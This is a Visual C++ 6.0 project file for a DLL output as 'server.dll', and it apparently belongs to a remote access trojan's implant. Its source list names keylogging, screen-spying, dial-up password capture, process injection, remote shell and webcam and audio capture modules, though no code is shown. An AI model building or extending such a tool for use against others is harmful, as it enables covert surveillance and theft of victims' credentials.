# Microsoft Developer Studio Project File - Name="MainDll" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Dynamic-Link Library" 0x0102

CFG=MainDll - Win32 Debug
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "MainDll.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "MainDll.mak" CFG="MainDll - Win32 Debug"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "MainDll - Win32 Release" (based on "Win32 (x86) Dynamic-Link Library")
!MESSAGE "MainDll - Win32 Debug" (based on "Win32 (x86) Dynamic-Link Library")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "MainDll - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /MT /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /D "_USRDLL" /D "MAINDLL_EXPORTS" /Yu"stdafx.h" /FD /c
# ADD CPP /nologo /MT /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /D "_USRDLL" /D "MAINDLL_EXPORTS" /D "STRSAFE_NO_DEPRECATE" /FR /Yu"stdafx.h" /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "NDEBUG"
# ADD RSC /l 0x804 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /dll /machine:I386
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib ..\..\common\zlib\zlib.lib Wininet.lib shlwapi.lib /nologo /dll /machine:I386 /out:"..\..\bin\server\server.dll"

!ELSEIF  "$(CFG)" == "MainDll - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 1
# PROP BASE Output_Dir "Debug"
# PROP BASE Intermediate_Dir "Debug"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 1
# PROP Output_Dir "Debug"
# PROP Intermediate_Dir "Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /MTd /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_MBCS" /D "_USRDLL" /D "MAINDLL_EXPORTS" /Yu"stdafx.h" /FD /GZ /c
# ADD CPP /nologo /MTd /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_MBCS" /D "_USRDLL" /D "MAINDLL_EXPORTS" /FR /Yu"stdafx.h" /FD /GZ /c
# ADD BASE MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "_DEBUG"
# ADD RSC /l 0x804 /d "_DEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /dll /debug /machine:I386 /pdbtype:sept
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib ..\..\common\zlib\zlib.lib Wininet.lib shlwapi.lib /nologo /dll /debug /machine:I386 /out:"..\..\bin\server\server.dll" /pdbtype:sept

!ENDIF 

# Begin Target

# Name "MainDll - Win32 Release"
# Name "MainDll - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Source File

SOURCE=..\..\common\Audio.cpp
# End Source File
# Begin Source File

SOURCE=.\common\AudioManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\Buffer.cpp
# End Source File
# Begin Source File

SOURCE=.\common\CaptureVideo.cpp
# End Source File
# Begin Source File

SOURCE=.\ClientSocket.cpp
# End Source File
# Begin Source File

SOURCE=.\common\Dialupass.cpp
# End Source File
# Begin Source File

SOURCE=.\common\FileManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\install.cpp
# End Source File
# Begin Source File

SOURCE=.\common\KernelManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\KeyboardManager.cpp
# End Source File
# Begin Source File

SOURCE=.\MainDll.cpp
# End Source File
# Begin Source File

SOURCE=.\common\Manager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\RegEditEx.cpp
# End Source File
# Begin Source File

SOURCE=.\common\RegeditOpt.cpp
# End Source File
# Begin Source File

SOURCE=.\common\RegManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\ScreenManager.cpp
# SUBTRACT CPP /YX /Yc /Yu
# End Source File
# Begin Source File

SOURCE=.\common\ScreenSpy.cpp
# End Source File
# Begin Source File

SOURCE=.\common\ServerManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\ShellManager.cpp
# End Source File
# Begin Source File

SOURCE=.\StdAfx.cpp
# ADD CPP /Yc"stdafx.h"
# End Source File
# Begin Source File

SOURCE=.\common\SystemManager.cpp
# End Source File
# Begin Source File

SOURCE=.\common\until.cpp
# End Source File
# Begin Source File

SOURCE=.\common\VideoCap.cpp
# End Source File
# Begin Source File

SOURCE=.\common\VideoManager.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Source File

SOURCE=..\common\Audio.h
# End Source File
# Begin Source File

SOURCE=.\common\AudioManager.h
# End Source File
# Begin Source File

SOURCE=.\common\Buffer.h
# End Source File
# Begin Source File

SOURCE=.\common\CaptureVideo.h
# End Source File
# Begin Source File

SOURCE=.\ClientSocket.h
# End Source File
# Begin Source File

SOURCE=.\common\Dialupass.h
# End Source File
# Begin Source File

SOURCE=.\common\filemanager.h
# End Source File
# Begin Source File

SOURCE=.\common\inject.h
# End Source File
# Begin Source File

SOURCE=.\common\KernelManager.h
# End Source File
# Begin Source File

SOURCE=.\common\KeyboardManager.h
# End Source File
# Begin Source File

SOURCE=.\common\Manager.h
# End Source File
# Begin Source File

SOURCE=.\common\RegEditEx.h
# End Source File
# Begin Source File

SOURCE=.\common\RegeditOpt.h
# End Source File
# Begin Source File

SOURCE=.\common\RegManager.h
# End Source File
# Begin Source File

SOURCE=.\common\ScreenManager.h
# End Source File
# Begin Source File

SOURCE=.\common\ScreenSpy.h
# End Source File
# Begin Source File

SOURCE=.\common\ServerManager.h
# End Source File
# Begin Source File

SOURCE=.\common\ShellManager.h
# End Source File
# Begin Source File

SOURCE=.\StdAfx.h
# End Source File
# Begin Source File

SOURCE=.\common\SystemManager.h
# End Source File
# Begin Source File

SOURCE=.\common\until.h
# End Source File
# Begin Source File

SOURCE=.\common\VideoCap.h
# End Source File
# Begin Source File

SOURCE=.\common\VideoManager.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# End Group
# Begin Source File

SOURCE=.\ReadMe.txt
# End Source File
# Begin Source File

SOURCE=.\strmiids.lib
# End Source File
# End Target
# End Project
